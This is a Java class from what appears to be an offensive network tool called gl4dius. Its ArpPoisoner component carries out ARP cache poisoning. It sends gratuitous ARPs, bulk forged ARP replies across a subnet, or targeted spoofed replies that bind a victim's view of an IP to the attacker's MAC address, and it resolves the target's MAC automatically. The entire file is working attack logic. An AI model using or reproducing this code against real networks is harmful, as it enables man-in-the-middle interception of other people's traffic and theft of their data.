package io.gl4dius.cli.module.arp;

import io.gl4dius.cli.exception.NeighborMacResolutionException;
import io.gl4dius.cli.service.NetDiscoveryService;
import io.gl4dius.cli.utility.NetInterfaceUtil;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Component;

@Slf4j
@Component
@RequiredArgsConstructor
public class ArpPoisoner {

    private final ArpSender arpSender;
    private final NetDiscoveryService netDiscoveryService;

    public void poison(String nicName, String spoofIp, String targetIp, String targetMac) {
        try {
            if (spoofIp == null && targetIp == null) {
                throw new IllegalArgumentException("You need to specify either spoofIp or targetIp");
            }

            if (targetIp != null && targetMac == null) {
                targetMac = this.netDiscoveryService.resolveNeighborMacAddress(nicName, targetIp)
                        .orElseThrow(() -> new NeighborMacResolutionException("Automatic NetDiscovery couldn't find target MAC address, you need to insert it manually"));
            }

            var nic = NetInterfaceUtil.findInterface(nicName);
            var interfaceMac = NetInterfaceUtil.resolveMac(nic);
            if (targetIp == null) {
                this.arpSender.sendGratuitousArp(nicName, spoofIp, interfaceMac.toString());
            } else if (spoofIp == null) {
                var ipv4Subnet = NetInterfaceUtil.resolveIpv4Subnet(nicName);
                this.arpSender.sendBulkArpReply(nicName, ipv4Subnet, interfaceMac.toString(), targetIp, targetMac);
            } else {
                this.arpSender.sendArpReply(nicName, spoofIp, interfaceMac.toString(), targetIp, targetMac);
            }
        } catch (Exception e) {
            log.error("Failed to poison ARP", e);
        }
    }
}
